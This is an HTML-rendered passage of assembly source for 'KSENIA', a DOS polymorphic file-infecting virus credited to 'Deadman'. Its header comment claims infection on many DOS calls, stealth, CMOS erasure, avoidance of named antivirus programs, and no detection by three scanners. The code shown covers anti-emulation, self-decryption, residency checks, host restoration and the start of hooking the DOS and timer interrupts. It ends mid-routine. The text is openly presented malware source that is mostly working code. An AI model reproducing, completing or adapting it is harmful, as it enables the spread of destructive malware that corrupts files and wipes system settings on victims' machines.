<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>KSENIA.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;  comment ъ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                 KSENIA Virus Version 1.0 Copyright (C) Deadman</span><span class="sc0">
</span><span class="sc1">;               └────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  TSR/COM/EXE fast polymorphic infector</span><span class="sc0">
</span><span class="sc1">;   Infects on 1857h/3Dh/41h/43h/4Bh/56h/6Ch/7141h/7143h/7156h/716Ch/71A9h</span><span class="sc0">
</span><span class="sc1">;      (Internal/Open/Del/Chmod/Exec/Ren/ExtOpen/LFNs/LFN Server Open)</span><span class="sc0">
</span><span class="sc1">;   Size/Date stealth on 11h/12h/4Eh/4Fh/5700h/5701h/714Eh/714Fh/71A6h</span><span class="sc0">
</span><span class="sc1">;      (Find First/Next FCB/DTA/LFN + Get/Set File Time/Date + Get Handle Info)</span><span class="sc0">
</span><span class="sc1">;   Redirection stealth on 3Fh/42h (Read/LSeek)</span><span class="sc0">
</span><span class="sc1">;   SFT stealth without using any SFT values (for Novell/Win95 compatibility)</span><span class="sc0">
</span><span class="sc1">;   Disinfects the host on 40h (Write)</span><span class="sc0">
</span><span class="sc1">;   Re-Hooks Int 21h vector after Win95 installation. Works perfectly!</span><span class="sc0">
</span><span class="sc1">;   Re-Hooks Int 21h vector if virus handler has been removed from the chain</span><span class="sc0">
</span><span class="sc1">;   Every second it calcucates CRC32 and erases CMOS if the CRC is incorrect</span><span class="sc0">
</span><span class="sc1">;   Virus stays resident in low memory, executing the host with 4B00h function</span><span class="sc0">
</span><span class="sc1">;   When some of AVs are executing, virus adds some parameters to cmdline</span><span class="sc0">
</span><span class="sc1">;   Polymorphic in files uses its internal polymorphic engine</span><span class="sc0">
</span><span class="sc1">;   Engine uses table-based instructions as a random size garbage (85% of 8086)</span><span class="sc0">
</span><span class="sc1">;   Engine uses different count and index registers</span><span class="sc0">
</span><span class="sc1">;   Generates different decryptors (ADD/SUB/XOR/NOT/NEG/ROR/ROL/INC/DEC imm8)</span><span class="sc0">
</span><span class="sc1">;   Has a second internal shield (secondary encrypts itself with a kewl method)</span><span class="sc0">
</span><span class="sc1">;   Will not infect files with a current hour stamp</span><span class="sc0">
</span><span class="sc1">;   Filenames with digits will not be infected</span><span class="sc0">
</span><span class="sc1">;   Will not infect AVP/DrWeb/Web/F-Prot/TB/ADInf/Clean/Scan/NOD/VSafe/Anti/NAV/FV/FindViru/Command</span><span class="sc0">
</span><span class="sc1">;   Disable stealth if PkZip/RAR/ARJ/LHA/ARC/DEFRAG/SPEEDISK/CHKDSK/BACKUP/MSBACKUP/ScanDisk/NDD are running</span><span class="sc0">
</span><span class="sc1">;   Intercepts Int 24h to disallow user be warned by a critial error message</span><span class="sc0">
</span><span class="sc1">;   Virus was analysed by these AVs</span><span class="sc0">
</span><span class="sc1">;       AVP 3.0.130 - No detection or warns</span><span class="sc0">
</span><span class="sc1">;       DRWEB 4.11  - No detection or warns</span><span class="sc0">
</span><span class="sc1">;       F-PROT 3.05 - No detection or warns</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                  Deadman from hell. E-Mail: dman@mail.ru ъ</span><span class="sc0">

 </span><span class="sc5">vsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">eov</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc0">      </span><span class="sc1">; дисковая память для вируса</span><span class="sc0">
 </span><span class="sc5">msize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">eom</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc0">      </span><span class="sc1">; размер памяти требуемой вирусу</span><span class="sc0">
 </span><span class="sc5">crlen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">256</span><span class="sc0">             </span><span class="sc1">; размер расшифровщика</span><span class="sc0">

 </span><span class="sc5">B</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">; некоторые сокращения</span><span class="sc0">
 </span><span class="sc5">W</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">D</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">&gt;</span><span class="sc0">

 </span><span class="sc5">mvs</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">Seg1</span><span class="sc4">,</span><span class="sc5">Seg2</span><span class="sc0">       </span><span class="sc1">; макрос</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Seg2</span><span class="sc0">            </span><span class="sc1">; mvs es,cs -&gt; push cs/pop es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">Seg1</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">tiny</span><span class="sc0">            </span><span class="sc1">; ШАПКА</span><span class="sc0">
        </span><span class="sc5">codeseg</span><span class="sc0">
        </span><span class="sc5">p386</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
 </span><span class="sc5">ksenia</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">           </span><span class="sc1">; нужно для 1-го запуска вируса</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crc</span><span class="sc0">             </span><span class="sc1">; подсчет CRC вируса</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">checksum</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; сравнение CRC32</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">shield</span><span class="sc0">          </span><span class="sc1">; эти CRLEN байт зарезервированы в теле</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">r_crc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">trans</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hex2a</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">trans</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">            </span><span class="sc1">; вируса для полиморфного расшифровщика</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">badcrc</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc5">hex2a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">aam</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3030h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">badcrc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Virus code has been modified. The correct CRC is '</span><span class="sc0">
 </span><span class="sc5">r_crc</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'00000000h'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">ksenia</span><span class="sc4">+</span><span class="sc5">CRLEN</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">; запрос версии ДОС, но это только для</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; виду. На самом деле берем из стека</span><span class="sc0">
 </span><span class="sc5">ip</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; сохраненное IP командой INT и</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip</span><span class="sc0">    </span><span class="sc1">; вычисляем разность смещений (delta)</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; так я обломал эмулятор web'а</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; читаем байт из ROM</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; обычно в этом месте хранится дата</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">          </span><span class="sc1">; и вирус читает slash из этой даты</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">                     </span><span class="sc1">; AX=00</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; AX=01</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; DX=01</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">; второе (внутреннее) кольцо защиты вируса</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc4">-</span><span class="sc5">shield</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">turbo</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; краткая структура:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; ДО:    byte1 byte2 byte3 byte4</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; ПОСЛЕ: b1+b2 b2+b3 b3+b4 b4+b5</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">turbo</span><span class="sc0">

 </span><span class="sc5">shield</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1856h</span><span class="sc0">        </span><span class="sc1">; проверка на присутствие вируса в памяти</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; AH=18 - пустая функция</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3265h</span><span class="sc0">        </span><span class="sc1">; AX=3265 - значит, что копия вируса уже в</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">install</span><span class="sc0">         </span><span class="sc1">; памяти</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">  </span><span class="sc1">; si-сохраненное начало хоста</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">         </span><span class="sc1">; откуда запустили вирус?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">run_exe</span><span class="sc0">         </span><span class="sc1">; если начинается на 'MZ' или 'ZM'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">         </span><span class="sc1">;  -&gt; из EXE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">run_exe</span><span class="sc0">         </span><span class="sc1">; иначе из СОМ</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">        </span><span class="sc1">; стартовали из СОМ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; восстановить в памяти</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; начало зараженного файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restp</span><span class="sc0">

 </span><span class="sc5">run_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; старое CS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; старое SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; старое SP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; IP</span><span class="sc0">

 </span><span class="sc5">restp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; восстановить регистры</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">912h</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">; отдать управление программе</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Инсталляция вируса в память</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">install</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; ES:DI = PSP:0100</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; DS:SI = код вируса</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ksenia</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">    </span><span class="sc1">; копируем код вируса поверх зараженной</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">msize</span><span class="sc0">        </span><span class="sc1">; программы сразу после PSP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; загружаем в стек команды для</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">         </span><span class="sc1">; копирования вируса</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0">  </span><span class="sc1">; rep movsb / retn 6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">far</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

 </span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; мы на новом месте, с правильным</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; смещением, как при компиляции</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg0</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; заполнение сегментных полей в EPB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WinOldAp</span><span class="sc0">        </span><span class="sc1">; получение статуса инсталляции WinOldAp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">w95state</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; сохранение флажка</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; AH=35 AL=INT# - функция для получения</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; вектора прерывания AL</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">io21p</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; сохранить вектор в ячейке памяти</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">io21p</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_dup</span><span class="sc0">         </span><span class="sc1">; установить 21-й вектор прерывания на другой</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">        </span><span class="sc1">; установить свой обработчик</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">handler</span><span class="sc0">      </span><span class="sc1">; прерывания</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3508h</span><span class="sc0">        </span><span class="sc1">; запрос вектора прерывания</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">io08</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">; сохранение вектора в ячейках памяти</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">io08</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2508h</span><span class="sc0">        </span><span class="sc1">; установка прерывания 08h (таймер)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">vguard</span><span class="sc0">       </span><span class="sc1">; для проверки целостности кода</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FixVirus</span><span class="sc0">        </span><span class="sc1">; заражение некоторых важных файлов</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">          </span><span class="sc1">; уменьшить до нужного размера блок</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">msize</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; памяти, выделенный программе</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">          </span><span class="sc1">; PSP:2Ch = сегмент окружения</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; поместить его в DS</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
